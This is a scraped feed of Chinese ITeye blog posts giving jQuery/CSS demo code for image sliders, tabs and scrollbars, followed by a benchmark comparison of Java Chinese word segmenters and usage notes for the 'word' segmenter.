<li><a href="">javascript特效网页banner制作焦点图片切换带按钮和固定图标控制图片左右滚动</a></li></ul></div><div><ul><li><a href="">纯CSS下拉菜单</a></li><li><a href="">CSS3的动画按钮泡泡</a></li><li><a href="">用CSS3更换一个确认对话框的jQuery</a></li><li><a href="">使用jQuery制作更好的selcet选择元素和CSS3</a></li> </ul></div><div><ul> <li><a href="">制作CSS3和HTML5的一个单页网站模板</a></li><li><a href="">一个HTML5的幻灯片基于jQuery框架</a></li> <li><a href="">旋转幻灯片使用jQuery和CSS3</a></li> </ul></div></div></div><pre>$("#testtab5").tab({tabId:"#tabtag5",tabTag:"li",conId:"#tabcon5",conTag:"div"}) </pre></div></div></body></html> 原文地址:http://www.corange.cn/archives/2011/12/3803.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
仿IBM首页焦点图,缩略图大图，带文字, corangecn.iteye.com.blog.2043366, Fri, 11 Apr 2014 09:41:14 +0800

 
演示地址:http://www.corange.cn/demo/3802/index.html <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>仿IBM首页焦点图</title><style type="text/css">*{margin:0;padding:0;list-style-type:none;}/* gallery */.gallery{background:url(images/loadsmall.gif) #000 no-repeat 330px 100px;overflow:hidden;width:760px;position:relative;height:240px;}.gallery ul{z-index:999;left:3px;bottom:0;position:absolute;text-align:left;}.gallery ul li{display:block;font-weight:900;font-size:12px;float:left;width:140px;color:#aaa;font-family:Arial;position:relative;height:50px;}.gallery li div{margin-top:5px;display:none;padding-left:10px;margin-left:70px;}.gallery li img{border-right:#fff 1px solid;border-top:#fff 1px solid;filter:alpha(opacity=60);left:10px;float:left;border-left:#fff 1px solid;width:52px;cursor:pointer;margin-right:4px;border-bottom:#fff 1px solid;position:absolute;top:5px;height:35px;moz-opacity:.6;}.gallery li.current div {display:block;}.gallery .frontText{font-weight:900;font-size:30px;height:36px;line-height:36px;z-index:999;left:20px;width:100%;color:#fff;font-family:Verdana;position:absolute;top:40px;}.gallery .frontTextBack{font-weight:900;font-size:30px;height:36px;line-height:36px;left:22px;width:100%;color:#000;font-family:Verdana;position:absolute;top:42px;}.gallery .frontTextSub{font-size:20px;height:26px;line-height:26px;left:25px;width:100%;color:#fff;font-family:Verdana;position:absolute;top:80px;}.gallery .bg{border-top:#999 1px solid;background:#000;filter:alpha(opacity=60);opacity:0.6;width:100%;bottom:0;position:absolute;height:50px;text-align:right;}.gallery .mask{z-index:990;background:url(images/mask.gif);left:0;width:100%;position:absolute;top:0;height:100%;}.gallery .picshow{text-align:center;}.gallery .gray{filter:Gray();}</style><script type="text/javascript" src="../jquery.js"></script></head><body><div class="gallery"><ul><li><img src="images/02.jpg" text="corange.cn|ASP,PHP,JSP,JS,ASP.NET,DIV,CSS等网站建设相关技术" pic="2" width="52" height="35" /><div>corange.cn</div></li><li><img src="images/01.jpg" text="Handy Code|春华秋实" pic="1" width="52" height="35" /><div>一片麦穗</div></li><li><img src="images/03.jpg" text="郁郁葱葱的生命|生生不息的生命" pic="3" width="52" height="35" /><div>一树绿叶</div></li><li><img src="images/04.jpg" text="孤独的一棵老树|等谁呢？" pic="4" width="70" height="47" /><div>一棵大树</div></li><li><img src="images/05.jpg" text="明媚的向日葵花|生生不息的生命" pic="5" width="70" height="47" /><div>一地葵花</div></li></ul><div class="frontTextBack"></div><div class="frontText"></div><div class="frontTextSub"></div><div class="bg"></div><div class="mask"></div><div class="picshow"><img height="240" width="760" src="" /></div></div><!--gallery end--><script type="text/javascript" src="js/slide.js"></script></body></html> 原文地址:http://www.corange.cn/archives/2011/12/3802.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
图片切换插件制作banner图片滚动播放、按钮控制图片滚动、选项卡等基于多功能jquery slide插件, corangecn.iteye.com.blog.2041916, Tue, 08 Apr 2014 09:02:53 +0800

图片切换插件制作banner图片滚动播放、按钮控制图片滚动、选项卡等基于多功能jquery slide插件
演示地址:http://www.corange.cn/demo/3801/index.html <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>图片切换插件制作banner图片滚动播放、按钮控制图片滚动、选项卡等基于多功能jquery slide插件</title><style type="text/css">/* CSS Document */*{margin:0;padding:0;}ul,ol{list-style:none outside;}img{border:0 none;vertical-align:top;}table{border-collapse:collapse;border-spacing:0;}body{font:12px/1.5 Tahoma, Helvetica, Arial, "\5b8b\4f53", sans-serif;}h1,h2,h3,h4,h5,h6{font-size:14px;}a:link, a:visited{text-decoration:none;}a:hover, a:focus, a:active{text-decoration:underline;}a:focus, a:active{outline:none;}.lft{float:left;display:inline;}.rgt{float:right;display:inline;}.clearfix:after{visibility:hidden;display:block;font-size:1px;content:" ";clear:both;height:0;}*html .clearfix{zoom:1;} /* IE6 */*:first-child+html .clearfix{zoom:1;}.layout{padding:0 0 0 40px;}.layout h2{margin:20px 0 20px 0;font-size:14px;}/*-------- 淡隐淡现选项卡 --------*/.row2{border:1px solid #E1E1E1;position:relative;width:300px;}.row2 .JQ-slide{background:url(images/side_bg1.jpg) no-repeat center top;}.row2 .JQ-slide-nav{float:none;overflow:hidden;zoom:1;padding:15px;}.row2 .JQ-slide-nav li{float:left;display:inline;background:url(images/slide_navbg.gif) no-repeat -70px 0;width:69px;height:23px;text-align:center;color:6b6b6b;font-weight:bold;text-align:center;line-height:22px;cursor:pointer;margin-right:5px;}.row2 .JQ-slide-nav li.on{background-position:0 0;color:white;}.row2 .JQ-slide-nav li.on a:link, .row2 .JQ-slide-nav li.on a:visited, .row2 .JQ-slide-nav li.on a:hover, .row2 .JQ-slide-nav li.on a:active{color:white;}.row2 .JQ-slide-content{position:relative;overflow:hidden;width:300px;height:120px;}.row2 .JQ-slide-content .newsList{position:absolute;top:0;left:0;background:white;}/*----------- 图片banner特效左右滚动 ------------*//* w_ctr */.w_ctr .JQ-slide{width:305px;height:190px;overflow:hidden;position:relative;}.w_ctr .JQ-slide-content{position:absolute;}/*必须要的元素*/.w_ctr .JQ-slide-content li{width:305px;height:190px;float:left;display:inline;position:relative;}.w_ctr .JQ-slide-content li img{width:305px;height:190px;}.w_ctr .JQ-slide-content li span{display:block;background:black;color:white;font-size:14px;font-weight:bold;padding:0 14px;line-height:28px;position:absolute;bottom:5px;left:0;z-index:10;width:275px;overflow:hidden;filter:alpha(opacity=50);-moz-opacity:0.5;-khtml-opacity:0.5;opacity:0.5;}.w_ctr .JQ-slide-nav{position:absolute;bottom:14px;right:8px;z-index:30;}.w_ctr .JQ-slide-nav li{float:left;display:inline;background:url(images/focus_li.png) no-repeat;width:10px;height:10px;text-indent:-999em;overflow:hidden;cursor:pointer;margin-right:5px;}.w_ctr .JQ-slide-nav li.on{background-position:-15px 0;}/*------ 图片左右滚动 ---------*//* hot picture */.hotPic{margin:0 0 0 40px;}.hotPic .JQ-slide{position:relative;width:810px;height:142px;margin:0 0 15px 0;background:#f9f9f9;padding:10px 35px;}.hotPic .JQ-slide .wrap{width:810px;height:142px;overflow:hidden;position:relative;}.hotPic .JQ-slide-content{position:absolute;}/*必须要的元素*/.hotPic .imgList li{width:152px;margin:0 5px;}.hotPic .imgList img{width:140px;height:100px;}.hotPic .imgList .txt{height:30px;line-height:30px;}.hotPic .JQ-slide-nav a{display:block;z-index:99;width:48px;height:48px;overflow:hidden;text-indent:-999em;text-decoration:none;position:absolute;top:40px;background:url(images/arrow_pic.png) no-repeat;}.hotPic .JQ-slide-nav a.prev{left:-20px;background-position:0 0;}.hotPic .JQ-slide-nav a.prev:hover{background-position:-100px 0;}.hotPic .JQ-slide-nav a.next{right:-20px;background-position:-50px 0;}.hotPic .JQ-slide-nav a.next:hover{background-position:-150px 0;}/* imgList */.imgList{float:none;overflow:hidden;zoom:1}.imgList li{float:left;display:inline;overflow:hidden;}.imgList li a{display:block;}.imgList li .img{border:1px solid #d8d8d8;padding:5px;}.imgList li a.img:hover{border-color:#b70000;}.imgList li .txt{text-align:center;overflow:hidden;}</style><script type="text/javascript" src="js/jquery.js"></script><script type="text/javascript" src="js/jquery.slide.js"></script><script type="text/javascript">$(function (){/* 用按钮控制图片左右滚动 */$(".hotPic .JQ-slide").Slide({effect:"scroolLoop",autoPlay:false,speed:"normal",timer:3000,steps:1});/* banner图片左右滚动 */$(".w_ctr .JQ-slide").Slide({effect:"scroolX",speed:"normal",timer:2000});/* 淡隐淡现选项卡 */$(".row2 .JQ-slide").Slide({autoPlay:false,effect:"fade",speed:"normal",timer:30000});});</script></head><body><div class="layout"><h2>淡隐淡现选项卡</h2><div class="row2"><div class="JQ-slide"><ul class="JQ-slide-nav"><li class="on"><a href="">jquery特效</a></li><li><a href="">javasc特效</a></li><li><a href="">css特效</a></li></ul><div class="JQ-slide-content"><ul class="newsList"><li><a href="">用jquery特效制作图片金字塔式放大缩小展示</a></li><li><a href="">jquery特效制作 slide 图片窗帘式滚动</a></li><li><a href="">仿苹果视网膜效应的jQuery和CSS</a></li><li><a href="">斯莱德奥特提示使用jQuery和CSS3</a></li></ul><ul class="newsList"><li><a href="">用jquery特效制作一个简单的图像预览</a></li><li><a href="">纯CSS下拉菜单</a></li><li><a href="">制作一个使用jQuery和CSS的拍摄效果</a></li><li><a href="">霓虹灯文字效果使用jQuery和CSS</a></li></ul><ul class="newsList"><li><a href="">简单的图片滑过显示横幅转子使用jQuery和css</a></li><li><a href="">灵活的网页:一个jQuery分页的解决方案</a></li><li><a href="">灵活Ajax选项卡使用jQuery及CSS3的</a></li><li><a href="">使用jQuery和CSS制作一个马赛克幻灯片</a></li></ul></div></div></div><h2>banner图片左右滚动</h2> <div class="w_ctr"><div class="JQ-slide"><ul class="JQ-slide-content"><li><a href="jquery/items/2011-07-27/84.html"><img src="../demo1.jpg" width="297" height="181" /><span>小展示</span></a></li><li><a href="jquery/items/2011-07-26/82.html"><img src="../demo2.jpg" width="297" height="181" /><span>jquery</span></a></li><li><a href="jquery/items/2011-02-26/60.html"><img src="../demo3.jpg" width="297" height="181" /><span>的jQuery和CSS</span></a></li><li><a href="jquery/items/2011-02-23/54.html"><img src="../demo4.jpg" width="297" height="181" /><span>用jQuery和CSS3</span></a></li></ul><ul class="JQ-slide-nav"><li class="on">1</li><li>2</li><li>3</li><li>4</li></ul></div></div><h2>用按钮控制图片左右滚动</h2><div class="hotPic"><div class="JQ-slide"><div class="JQ-slide-nav"><a class="prev" href="javascript:void(0);">&#8249;</a><a class="next" href="javascript:void(0);">&#8250;</a></div><div class="wrap"><ul class="JQ-slide-content imgList"><li><a href="#" class="img"><img src="../demo1.jpg" width="140" height="100" /></a><a href="#" class="txt">用jquery</a></li><li><a href="#" class="img"><img src="../demo2.jpg" width="140" height="100" /></a><a href="#" class="txt">jquery</a></li><li><a href="#" class="img"><img src="../demo3.jpg" width="140" height="100" /></a><a href="#" class="txt">jQuery和CSS</a></li><li><a href="#" class="img"><img src="../demo4.jpg" width="140" height="100" /></a><a href="#" class="txt">jQuery和CSS3</a></li><li><a href="#" class="img"><img src="../demo5.jpg" width="140" height="100" /></a><a href="#" class="txt">php</a></li><li><a href="#" class="img"><img src="../demo6.jpg" width="140" height="100" /></a><a href="#" class="txt">asp</a></li><li><a href="#" class="img"><img src="../demo7.jpg" width="140" height="100" /></a><a href="#" class="txt">2</a></li><li><a href="#" class="img"><img src="../demo8.jpg" width="140" height="100" /></a><a href="#" class="txt">a</a></li></ul></div></div></div> </div> </body></html> 原文地址:http://www.corange.cn/archives/2011/12/3801.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Ajax选项卡使用jQuery及CSS3, corangecn.iteye.com.blog.2038885, Mon, 31 Mar 2014 15:30:25 +0800

 
演示地址:http://www.corange.cn/demo/3800/index.html <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Ajax选项卡使用jQuery及CSS3--www.corange.cn演示</title><script src="http://www.google.com/jsapi" type="text/javascript"></script> <script type="text/javascript"> google.load("jquery", "1.2.6"); </script></head><body><div id="main"><ul class="tabContainer"><!-- The jQuery generated tabs go here --></ul><div class="clear"></div><div id="tabContent"><div id="contentHolder"><!-- The AJAX fetched content goes here --></div></div></div><link rel="stylesheet" type="text/css" href="styles.css" /><script type="text/javascript" src="script.js"></script></body></html> 原文地址:http://www.corange.cn/archives/2011/11/3800.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
jquery hScrollPane 水平或横行滚动条插件, corangecn.iteye.com.blog.2037701, Thu, 27 Mar 2014 20:18:32 +0800

 
演示地址:http://www.corange.cn/demo/3799/index.html <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>水平滚动条Demo</title><style type="text/css">*{margin:0;padding:0;list-style-type:none;}a,img{border:0;}body{color:#333;font: 12px/1.5 tahoma, arial, \5b8b\4f53, sans-serif;}a{color:#333;text-decoration:none;}a:hover{color:#3366cc;text-decoration:underline;}.scrolltitle{height:24px;font-size:14px;width:980px;border-bottom:solid 1px #ddd;margin:20px auto 15px auto;}.scrolllist{width:980px;height:254px;margin:0 auto;}.imgshow{width:980px;margin:0 auto;}.imgshow .imgzoom{margin:0 auto;width:300px;border:solid 1px #000;}/* container */.container{width:620px;height:224px;margin:20px auto;overflow:hidden;position:relative;}.container ul{width:10000px;position:absolute;left:0px;top:0px;padding:0;margin:0;}.container ul li{width:308px;padding:0 10px;float:left;text-align:center;}.container ul li p{height:40px;line-height:20px;overflow:hidden;}.container ul li img{border:1px solid #ddd;padding:3px;}.container ul li div.current img{border:solid 1px #ff6600;padding:3px;}/* hScrollPane */.hScrollPane_dragbar,.hScrollPane_draghandle,.hScrollPane_leftarrow,.hScrollPane_rightarrow{background:url(images/dragbar.gif);}.hScrollPane_dragbar{position:absolute;left:0px;bottom:0px;height:16px;margin:0 auto;background-position:left -32px;}.hScrollPane_draghandle{height:14px;width:30px;border:1px solid #d5d3d3;overflow:hidden;position:absolute;top:0px;left:0px;cursor:default;background-position:center -48px;background-repeat:no-repeat;background-color:#e5e5e5;-moz-border-radius:2px;-khtml-border-radius:2px;-webkit-border-radius:2px;border-radius:2px;}.hScrollPane_leftarrow,.hScrollPane_rightarrow{display:inline-block;height:16px;width:17px;overflow:hidden;position:absolute;bottom:0;}.hScrollPane_leftarrow{left:0;}.hScrollPane_leftarrow:hover{background-position:left -64px;}.hScrollPane_rightarrow{right:0;background-position:left -16px;}.hScrollPane_rightarrow:hover{background-position:left -80px;}.draghandlealter{background-position:center -96px;background-color:#efefef;}</style></head><body><h2 class="scrolltitle">jquery hScrollPane 水平或横行滚动条插件 默认状态属性</h2><pre class="scrolllist">$(".container").hScrollPane({mover:".press", //指定container对象下的哪个元素需要滚动位置 | 必传项;moverW:function(){return $(".press").width();}(), //传入水平滚动对象的长度值,不传入的话默认直接获取mover的宽度值 | 可选项;handleMinWidth:300, //指定handle的最小宽度,要固定handle的宽度请在css中设定handle的width属性（如 width:28px!important;），不传入则不设定最小宽度 | 可选项;showArrow:true, //指定是否显示左右箭头，默认不显示 | 可选项;dragable:false, //指定是否要支持拖动效果，默认可以拖动 | 可选项;handleCssAlter:"draghandlealter", //指定拖动鼠标时滚动条的样式，不传入该参数则没有变化效果 | 可选项;easing:true, //滚动是否需要滑动效果,默认有滑动效果 | 可选项;mousewheel:{bind:true,moveLength:500} //mousewheel: bind->'true',绑定mousewheel事件; ->'false',不绑定mousewheel事件；moveLength是指定鼠标滚动一次移动的距离,默认值：{bind:true,moveLength:300} | 可选项;});</pre><h2 class="scrolltitle">设置水平滚动条商品图片横行展示</h2><div class="imgshow"><div class="imgzoom"><img src="../demo1.jpg" alt="" /><div class="loading"></div></div><div class="container thumblist"><ul><li><div class="current"><a href="../demo1.jpg"><img src="../demo1.jpg" alt="" /></a></div><p><a href="" target="_blank">1111</a></p></li><li><div class="current"><a href="../demo2.jpg"><img src="../demo2.jpg" alt="" /></a></div><p><a href="" target="_blank">1111</a></p></li><li><div class="current"><a href="../demo3.jpg"><img src="../demo3.jpg" alt="" /></a></div><p><a href="" target="_blank">1111</a></p></li><li><div class="current"><a href="../demo4.jpg"><img src="../demo4.jpg" alt="" /></a></div><p><a href="" target="_blank">1111</a></p></li></ul></div></div><!--imgshow end--><script type="text/javascript" src="http://www.jsfoot.com/skin/js/jquery.js"></script><script type="text/javascript" src="js/jquery.mousewheel.js"></script><script type="text/javascript" src="js/hScrollPane.js"></script><script type="text/javascript">$(".container").hScrollPane({mover:"ul",moverW:function(){return $(".container li").length*335;}(),showArrow:true,handleCssAlter:"draghandlealter",mousewheel:{moveLength:207}});$(function(){var img=new Image();var imgshowobj=$(".imgshow");var imgzoom=imgshowobj.find(".imgzoom");imgshowobj.find(".thumblist").find("div a").live("click",function(){imgzoom.find(".loading").show();img.onload=function(){imgzoom.find("img").attr("src",img.src);imgzoom.find(".loading").hide();}img.src=$(this).attr("href");$(".thumblist li div a").parent().removeClass("current");$(this).parent().addClass("current");return false;});}); </script></body></html> 原文地址:http://www.corange.cn/archives/2011/11/3799.html
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java开源项目cws_evaluation：中文分词器分词效果评估, yangshangchuan.iteye.com.blog.2059040, Thu, 01 May 2014 02:44:24 +0800

cws_evaluation 是一个Java开源项目，用于对Java中文分词器分词效果进行评估。
 
cws_evaluation 是通过对前文《word分词器、ansj分词器、mmseg4j分词器、ik-analyzer分词器分词效果评估》中写的评估程序进行重构改进后形成的。
 
支持的分词器有：word分词器、ansj分词器、mmseg4j分词器、ik-analyzer分词器、jcseg分词器、fudannlp分词器、paoding分词器、jieba分词器、stanford分词器等9大中文分词器。
 
评估采用的测试文本有253 3709行，共2837 4490个字符。
 
cws_evaluation主页
可运行程序下载
 
最好的评估结果是word分词 全切分算法（trigram）：
 
word分词 全切分算法（trigram）：
分词速度：42.10602 字符/毫秒
行数完美率：65.04%  行数错误率：34.95%  总的行数：2533709  完美行数：1648163  错误行数：885546
字数完美率：56.3% 字数错误率：43.69% 总的字数：28374490 完美字数：15976750 错误字数：12397740
 
 
下面的评估数据中，word分词使用bigram，按行数完美率排序：
 
1：
word分词 全切分算法：
分词速度：40.259953 字符/毫秒
行数完美率：58.79%  行数错误率：41.2%  总的行数：2533709  完美行数：1489713  错误行数：1043996
字数完美率：49.53% 字数错误率：50.46% 总的字数：28374490 完美字数：14054431 错误字数：14320059
2：
Ansj ToAnalysis 精准分词：
分词速度：705.25415 字符/毫秒
行数完美率：58.6%  行数错误率：41.39%  总的行数：2533709  完美行数：1484830  错误行数：1048879
字数完美率：50.96% 字数错误率：49.03% 总的字数：28374490 完美字数：14462190 错误字数：13912300
3：
Stanford Beijing University segmentation：
分词速度：14.4612055 字符/毫秒
行数完美率：58.29%  行数错误率：41.7%  总的行数：2533709  完美行数：1477034  错误行数：1056675
字数完美率：51.36% 字数错误率：48.63% 总的字数：28374490 完美字数：14574120 错误字数：13800370
4：
Ansj NlpAnalysis NLP分词：
分词速度：171.70125 字符/毫秒
行数完美率：58.15%  行数错误率：41.84%  总的行数：2533687  完美行数：1473377  错误行数：1060310
字数完美率：49.8% 字数错误率：50.19% 总的字数：28374398 完美字数：14132290 错误字数：14242108
5：
Stanford Chinese Treebank segmentation：
分词速度：13.723294 字符/毫秒
行数完美率：55.45%  行数错误率：44.54%  总的行数：2533709  完美行数：1404968  错误行数：1128741
字数完美率：47.27% 字数错误率：52.72% 总的字数：28374490 完美字数：13414926 错误字数：14959564
6：
word分词 双向最大最小匹配算法：
分词速度：172.1868 字符/毫秒
行数完美率：55.31%  行数错误率：44.68%  总的行数：2533709  完美行数：1401582  错误行数：1132127
字数完美率：45.83% 字数错误率：54.16% 总的字数：28374490 完美字数：13005696 错误字数：15368794
7：
Ansj BaseAnalysis 基本分词：
分词速度：834.34753 字符/毫秒
行数完美率：55.31%  行数错误率：44.68%  总的行数：2533709  完美行数：1401582  错误行数：1132127
字数完美率：48.17% 字数错误率：51.82% 总的字数：28374490 完美字数：13670258 错误字数：14704232
8：
word分词 双向最大匹配算法：
分词速度：270.38776 字符/毫秒
行数完美率：52.01%  行数错误率：47.98%  总的行数：2533709  完美行数：1317801  错误行数：1215908
字数完美率：42.42% 字数错误率：57.57% 总的字数：28374490 完美字数：12038414 错误字数：16336076
9：
FudanNLP：
分词速度：94.249245 字符/毫秒
行数完美率：51.48%  行数错误率：48.51%  总的行数：2533709  完美行数：1304371  错误行数：1229338
字数完美率：43.22% 字数错误率：56.77% 总的字数：28374490 完美字数：12265742 错误字数：16108748
10：
Jieba SEARCH：
分词速度：662.1663 字符/毫秒
行数完美率：51.42%  行数错误率：48.57%  总的行数：2533709  完美行数：1303081  错误行数：1230628
字数完美率：42.09% 字数错误率：57.9% 总的字数：28374490 完美字数：11944313 错误字数：16430177
11：
Ansj IndexAnalysis 面向索引的分词：
分词速度：750.1914 字符/毫秒
行数完美率：50.89%  行数错误率：49.1%  总的行数：2533709  完美行数：1289517  错误行数：1244192
字数完美率：42.96% 字数错误率：57.03% 总的字数：28374490 完美字数：12191132 错误字数：16183358
12：
Jcseg 复杂模式：
分词速度：412.83997 字符/毫秒
行数完美率：48.64%  行数错误率：51.35%  总的行数：2533709  完美行数：1232550  错误行数：1301159
字数完美率：39.59% 字数错误率：60.4% 总的字数：28374490 完美字数：11236204 错误字数：17138286
13：
word分词 双向最小匹配算法：
分词速度：343.60004 字符/毫秒
行数完美率：46.76%  行数错误率：53.23%  总的行数：2533709  完美行数：1185013  错误行数：1348696
字数完美率：36.52% 字数错误率：63.47% 总的字数：28374490 完美字数：10365168 错误字数：18009322
14：
word分词 逆向最大匹配算法：
分词速度：607.2527 字符/毫秒
行数完美率：46.72%  行数错误率：53.27%  总的行数：2533709  完美行数：1183913  错误行数：1349796
字数完美率：36.67% 字数错误率：63.32% 总的字数：28374490 完美字数：10407342 错误字数：17967148
15：
word分词 正向最大匹配算法：
分词速度：615.3252 字符/毫秒
行数完美率：46.66%  行数错误率：53.33%  总的行数：2533709  完美行数：1182351  错误行数：1351358
字数完美率：36.73% 字数错误率：63.26% 总的字数：28374490 完美字数：10422209 错误字数：17952281
16：
Jcseg 简易模式：
分词速度：750.60815 字符/毫秒
行数完美率：45.24%  行数错误率：54.75%  总的行数：2533709  完美行数：1146355  错误行数：1387354
字数完美率：36.48% 字数错误率：63.51% 总的字数：28374490 完美字数：10352723 错误字数：18021767
17：
word分词 逆向最小匹配算法：
分词速度：970.16754 字符/毫秒
行数完美率：41.78%  行数错误率：58.21%  总的行数：2533709  完美行数：1058606  错误行数：1475103
字数完美率：31.68% 字数错误率：68.31% 总的字数：28374490 完美字数：8989797 错误字数：19384693
18：
MMSeg4j ComplexSeg：
分词速度：1071.8275 字符/毫秒
行数完美率：38.81%  行数错误率：61.18%  总的行数：2533688  完美行数：983517  错误行数：1550171
字数完美率：29.6% 字数错误率：70.39% 总的字数：28374428 完美字数：8400089 错误字数：19974339
19：
MMSeg4j SimpleSeg：
分词速度：1369.4913 字符/毫秒
行数完美率：37.57%  行数错误率：62.42%  总的行数：2533688  完美行数：951909  错误行数：1581779
字数完美率：28.45% 字数错误率：71.54% 总的字数：28374428 完美字数：8074021 错误字数：20300407
20：
IKAnalyzer 智能切分：
分词速度：350.47543 字符/毫秒
行数完美率：37.55%  行数错误率：62.44%  总的行数：2533686  完美行数：951638  错误行数：1582048
字数完美率：27.97% 字数错误率：72.02% 总的字数：28374416 完美字数：7938726 错误字数：20435690
21：
word分词 正向最小匹配算法：
分词速度：1079.0421 字符/毫秒
行数完美率：36.85%  行数错误率：63.14%  总的行数：2533709  完美行数：933769  错误行数：1599940
字数完美率：26.85% 字数错误率：73.14% 总的字数：28374490 完美字数：7621334 错误字数：20753156
22：
Jieba INDEX：
分词速度：622.5616 字符/毫秒
行数完美率：36.44%  行数错误率：63.55%  总的行数：2533709  完美行数：923459  错误行数：1610250
字数完美率：26.25% 字数错误率：73.74% 总的字数：28374490 完美字数：7448925 错误字数：20925565
23：
MMSeg4j MaxWordSeg：
分词速度：1064.9885 字符/毫秒
行数完美率：34.27%  行数错误率：65.72%  总的行数：2533688  完美行数：868440  错误行数：1665248
字数完美率：25.2% 字数错误率：74.79% 总的字数：28374428 完美字数：7152898 错误字数：21221530
24：
IKAnalyzer 细粒度切分：
分词速度：366.91785 字符/毫秒
行数完美率：18.87%  行数错误率：81.12%  总的行数：2533686  完美行数：478176  错误行数：2055510
字数完美率：10.93% 字数错误率：89.06% 总的字数：28374416 完美字数：3103178 错误字数：25271238
25：
Paoding MAX_WORD_LENGTH_MODE：
分词速度：1343.1075 字符/毫秒
行数完美率：14.19%  行数错误率：85.8%  总的行数：2533158  完美行数：359637  错误行数：2173521
字数完美率：7.72% 字数错误率：92.27% 总的字数：28373102 完美字数：2191349 错误字数：26181753
26：
Paoding MOST_WORDS_MODE：
分词速度：1338.9246 字符/毫秒
行数完美率：11.6%  行数错误率：88.39%  总的行数：2533158  完美行数：294011  错误行数：2239147
字数完美率：5.92% 字数错误率：94.07% 总的字数：28373102 完美字数：1680261 错误字数：26692841
 
 
已有 5 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java中文分词组件 - word分词, yangshangchuan.iteye.com.blog.2056959, Tue, 29 Apr 2014 11:29:50 +0800

word分词器主页 
 
word分词是一个Java实现的中文分词组件，提供了多种基于词典的分词算法，并利用ngram模型来消除歧义。 能准确识别英文、数字，以及日期、时间等数量词，能识别人名、地名、组织机构名等未登录词。 同时提供了Lucene、Solr、ElasticSearch插件。
 
分词使用方法：
 　　1、快速体验　　运行项目根目录下的脚本demo-word.bat可以快速体验分词效果　　用法: command [text] [input] [output]　　命令command的可选值为：demo、text、file　　demo　　text 杨尚川是APDPlat应用级产品开发平台的作者　　file d:/text.txt d:/word.txt　　exit
　　2、对文本进行分词　　移除停用词：List<Word> words = WordSegmenter.seg("杨尚川是APDPlat应用级产品开发平台的作者");　　保留停用词：List<Word> words = WordSegmenter.segWithStopWords("杨尚川是APDPlat应用级产品开发平台的作者");　　System.out.println(words);
 　　输出：　　移除停用词：[杨尚川, apdplat, 应用级, 产品, 开发平台, 作者]　　保留停用词：[杨尚川, 是, apdplat, 应用级, 产品, 开发平台, 的, 作者]
　　3、对文件进行分词　　String input = "d:/text.txt";　　String output = "d:/word.txt";　　移除停用词：WordSegmenter.seg(new File(input), new File(output));　　保留停用词：WordSegmenter.segWithStopWords(new File(input), new File(output));
　　4、自定义配置文件　　默认配置文件为类路径下的word.conf，打包在word-x.x.jar中　　自定义配置文件为类路径下的word.local.conf，需要用户自己提供　　如果自定义配置和默认配置相同，自定义配置会覆盖默认配置　　配置文件编码为UTF-8
 　　5、自定义用户词库　　自定义用户词库为一个或多个文件夹或文件，可以使用绝对路径或相对路径　　用户词库由多个词典文件组成，文件编码为UTF-8　　词典文件的格式为文本文件，一行代表一个词　　可以通过系统属性或配置文件的方式来指定路径，多个路径之间用逗号分隔开　　类路径下的词典文件，需要在相对路径前加入前缀classpath:
 　　指定方式有三种：　　指定方式一，编程指定（高优先级）：　　WordConfTools.set("dic.path", "classpath:dic.txt，d:/custom_dic");　　DictionaryFactory.reload();//更改词典路径之后，重新加载词典　　指定方式二，Java虚拟机启动参数（中优先级）：　　java -Ddic.path=classpath:dic.txt，d:/custom_dic　　指定方式三，配置文件指定（低优先级）：　　使用类路径下的文件word.local.conf来指定配置信息　　dic.path=classpath:dic.txt，d:/custom_dic
　　如未指定，则默认使用类路径下的dic.txt词典文件
　　6、自定义停用词词库　　使用方式和自定义用户词库类似，配置项为：　　stopwords.path=classpath:stopwords.txt，d:/custom_stopwords_dic
　　7、自动检测词库变化　　可以自动检测自定义用户词库和自定义停用词词库的变化　　包含类路径下的文件和文件夹、非类路径下的绝对路径和相对路径　　如：　　classpath:dic.txt，classpath:custom_dic_dir,　　d:/dic_more.txt，d:/DIC_DIR，D:/DIC2_DIR，my_dic_dir，my_dic_file.txt
 　　classpath:stopwords.txt，classpath:custom_stopwords_dic_dir，　　d:/stopwords_more.txt，d:/STOPWORDS_DIR，d:/STOPWORDS2_DIR，stopwords_dir，remove.txt
 　　8、显式指定分词算法　　对文本进行分词时，可显式指定特定的分词算法，如：　　WordSegmenter.seg("APDPlat应用级产品开发平台", SegmentationAlgorithm.BidirectionalMaximumMatching);
